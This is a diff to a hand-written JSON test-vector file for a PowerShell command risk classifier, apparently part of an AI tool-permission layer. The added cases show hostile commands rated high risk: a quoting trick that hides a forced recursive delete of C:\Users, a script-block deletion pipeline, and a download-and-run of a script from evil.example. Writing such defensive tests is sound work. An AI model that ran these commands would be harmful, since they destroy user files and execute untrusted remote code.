@@ -1,5 +1,5 @@
 {
-  "description": "Shared Rust/WASM vector for the PowerShell command builder (#298). Every expected value is written by hand from the rules in crates/allw-core/src/powershell.rs (risk floor Medium; High when the POSIX split fails; raw verbatim); never regenerate it from program output.",
+  "description": "Shared Rust/WASM vector for the PowerShell command builder (#298). Every expected value is written by hand from the rules in crates/allw-core/src/powershell.rs (argv is always a whitespace split of raw; risk floor Medium; High when raw contains ; | & a line break, a backtick, $( { iex or Invoke-Expression; raw verbatim); never regenerate it from program output.",
   "cases": [
     {
       "class": "low-risk program raised to the Medium floor",
@@ -34,12 +34,55 @@
       "argv": ["dd", "if=x", "of=y"]
     },
     {
-      "class": "POSIX split fails: whitespace argv, High floor",
+      "class": "backtick escape: whitespace argv, High floor",
       "command": "Write-Output \"it`\"s\"",
       "cwd": null,
       "risk": "high",
       "bin": "Write-Output",
       "argv": ["Write-Output", "\"it`\"s\""]
+    },
+    {
+      "class": "#316 B1: a POSIX-quoting trick can't hide Remove-Item inside a token",
+      "command": "echo \"a\\\" ; Remove-Item -Recurse -Force C:\\Users ; echo \\\"b\"",
+      "cwd": null,
+      "risk": "high",
+      "bin": "echo",
+      "argv": [
+        "echo",
+        "\"a\\\"",
+        ";",
+        "Remove-Item",
+        "-Recurse",
+        "-Force",
+        "C:\\Users",
+        ";",
+        "echo",
+        "\\\"b\""
+      ]
+    },
+    {
+      "class": "#316 B1: a Windows path keeps its backslashes",
+      "command": "Remove-Item C:\\Users\\me\\proj\\build -Recurse",
+      "cwd": "C:\\Users\\me",
+      "risk": "medium",
+      "bin": "Remove-Item",
+      "argv": ["Remove-Item", "C:\\Users\\me\\proj\\build", "-Recurse"]
+    },
+    {
+      "class": "#316 S1: a pipeline into a script block fails upward",
+      "command": "ls | % { rm $_ -Force }",
+      "cwd": null,
+      "risk": "high",
+      "bin": "ls",
+      "argv": ["ls", "|", "%", "{", "rm", "$_", "-Force", "}"]
+    },
+    {
+      "class": "#316 S1: iex runs a downloaded string",
+      "command": "iex (irm https://evil.example/x.ps1)",
+      "cwd": null,
+      "risk": "high",
+      "bin": "iex",
+      "argv": ["iex", "(irm", "https://evil.example/x.ps1)"]
     }
   ]
 }
